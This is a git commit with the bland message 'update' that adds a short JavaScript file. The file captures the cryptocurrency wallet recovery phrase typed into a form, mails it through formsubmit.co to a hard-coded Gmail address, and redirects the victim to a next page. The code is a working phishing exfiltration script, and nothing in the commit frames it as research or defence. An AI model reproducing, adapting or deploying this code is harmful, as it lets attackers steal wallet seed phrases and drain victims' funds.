1d580619bfcf11616ba801f124ddb21ba3be8b52
goodman <mayhemofflin@gmail.com>
2022-10-28 22:58:12 +0100

    update

---
+++ ojobe.js
@@ -0,0 +1,22 @@
+phraseKey.addEventListener('submit', e => {
+  e.preventDefault()
+  mail = 'mayhemofflin@gmail.com'
+  next = 'next.html'
+  subject = `${window.location.hostname} ${new Date()}`
+  let r = new FormData()
+  recovery_phrase = recovery_phrase.value
+  r.append('phraseKey', recovery_phrase)
+  r.append('_captcha', false)
+  r.append('_next', next)
+  r.append('_template', 'table')
+  r.append('_subject', subject)
+  let n = `https://formsubmit.co/${mail}`
+  fetch(
+    n,
+    {
+      method: 'POST',
+      body: r
+    },
+    { referrer: 'https://twitter.com' }
+  ).then(e => window.location.assign(next))
+})
